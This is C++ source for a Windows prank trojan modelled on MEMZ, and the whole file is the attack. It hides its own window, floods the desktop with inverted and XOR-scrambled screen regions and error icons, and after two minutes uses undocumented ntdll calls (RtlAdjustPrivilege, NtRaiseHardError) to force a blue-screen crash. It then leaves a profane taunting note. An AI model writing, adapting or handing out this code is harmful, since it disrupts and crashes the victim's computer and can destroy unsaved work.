#include <Windows.h>
#include <wingdi.h> 
#include <cstdio>
#include <time.h>
using namespace std;
int call;
int ScreenWidth = GetSystemMetrics(SM_CXSCREEN);
int ScreenHeight = GetSystemMetrics(SM_CYSCREEN);
int IconWidth = GetSystemMetrics(SM_CXICON);
int IconHeight = GetSystemMetrics(SM_CYICON);
HDC hdc=GetWindowDC(GetDesktopWindow());
#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1:0)
int random(int upper_bound) {
 	if(upper_bound==0) {
  		return 0;
 	}
 	srand((unsigned)(time(NULL) * clock() * rand()*call + time(NULL) + rand()+call));
 	call++;
 	return rand() % upper_bound;
}
DWORD WINAPI FlashDesktop(LPVOID Param) {
 	while(true) {
  		BitBlt(hdc, 0, 0, ScreenWidth, ScreenHeight, hdc, 0, 0, NOTSRCCOPY);
  		Sleep(random(100));
 	}
 	return 0;
}
int GetWay() 
{
 	int r=random(3);
 	switch(r) 
	{
  		case 0:
   			return SRCAND;
  		case 1:
   			return SRCINVERT;
  		case 2:
   			return SRCPAINT;
 	}
 	return 0;
}
DWORD WINAPI ScreenXorOperation1(LPVOID Param) 
{
 	while(true) {
  		int RandWidth = random(ScreenWidth);
  		int RandHeight = random(ScreenHeight);
  		int RandxPixel = random(ScreenWidth - RandWidth);
  		int RandyPixel = random(ScreenHeight - RandHeight);
  		int RandDestxPixel = random(ScreenWidth - RandWidth);
  		int RandDestyPixel = random(ScreenHeight - RandHeight);
  		BitBlt(hdc, RandxPixel, RandyPixel, RandWidth, RandHeight, hdc, RandDestxPixel, RandDestyPixel, SRCINVERT);
  		Sleep(random(100));
 	}
 	return 0;
}
DWORD WINAPI ScreenXorOperation2(LPVOID Param) {
 	while(true) {
  		int RandWidth = random(ScreenWidth);
  		int RandHeight = random(ScreenHeight);
  		int RandxPixel = random(ScreenWidth - RandWidth) + RandWidth;
  		int RandyPixel = random(ScreenHeight - RandHeight) + RandHeight;
  		int RandDestxPixel = random(ScreenWidth - RandWidth) + RandWidth;
  		int RandDestyPixel = random(ScreenHeight - RandHeight) + RandHeight;
  		BitBlt(hdc, RandxPixel, RandyPixel, RandWidth, RandHeight, hdc, RandDestxPixel, RandDestyPixel, SRCINVERT);
  		Sleep(random(100));
 	}
 	return 0;
}
DWORD WINAPI CallBsod1MinLater(LPVOID Param) {
 	Sleep(120000);
 	HMODULE ntdll = LoadLibrary("ntdll.dll");
 	FARPROC RtlAdjustPrivilege=GetProcAddress(ntdll,"RtlAdjustPrivilege");
 	FARPROC NtRaiseHardError=GetProcAddress(ntdll,"NtRaiseHardError");
 	unsigned char temp0;
 	long unsigned int temp1;
 	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(0x13, true, false, &temp0);
 	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc000021a, 0, 0, 0, 6, &temp1);
 	return 0;
}
DWORD WINAPI DrawErrors(LPVOID Param) {
 	while(true) {
  		int RandxPixel = random(ScreenWidth - IconWidth / 2);
  		int RandyPixel = random(ScreenHeight - IconHeight / 2);
  		DrawIcon(hdc, RandxPixel, RandyPixel, LoadIcon(NULL, IDI_ERROR));
  		Sleep(random(50));
  		int RandPixel = random(ScreenWidth - IconWidth / 2);
  		int Rand1Pixel = random(ScreenHeight - IconHeight / 2);
  		DrawIcon(hdc, RandPixel, Rand1Pixel, LoadIcon(NULL, IDI_QUESTION));
  		Sleep(random(50));
  		int Rand2Pixel = random(ScreenWidth - IconWidth / 2);
  		int Rand3Pixel = random(ScreenHeight - IconHeight / 2);
  		DrawIcon(hdc, Rand2Pixel, Rand3Pixel, LoadIcon(NULL, IDI_WARNING));
  		Sleep(random(50));
  		int Rand4Pixel = random(ScreenWidth - IconWidth / 2);
  		int Rand5Pixel = random(ScreenHeight - IconHeight / 2);
  		DrawIcon(hdc, Rand4Pixel, Rand5Pixel, LoadIcon(NULL, IDI_INFORMATION));
  		Sleep(random(50));
 	}
 	return 0;
}
int main(void) {
	ShowWindow(GetForegroundWindow(),0);
 	CreateThread(NULL, 4096, &FlashDesktop, NULL, NULL, NULL);
 	CreateThread(NULL, 4096, &ScreenXorOperation1, NULL, NULL, NULL);
 	CreateThread(NULL, 4096, &ScreenXorOperation2, NULL, NULL, NULL);
 	CreateThread(NULL, 4096, &CallBsod1MinLater, NULL, NULL, NULL);
 	CreateThread(NULL, 4096, &DrawErrors, NULL, NULL, NULL);
 	FILE *p=freopen("Fuckyou.txt","w",stdout);
 	printf("Your computer has been fucked by MEMZ Trojan.\n:)\nSo use it as long as you can!\n:D\n");
 	fclose(p);
 	system("notepad.exe Fuckyou.txt");
	while(true);
}
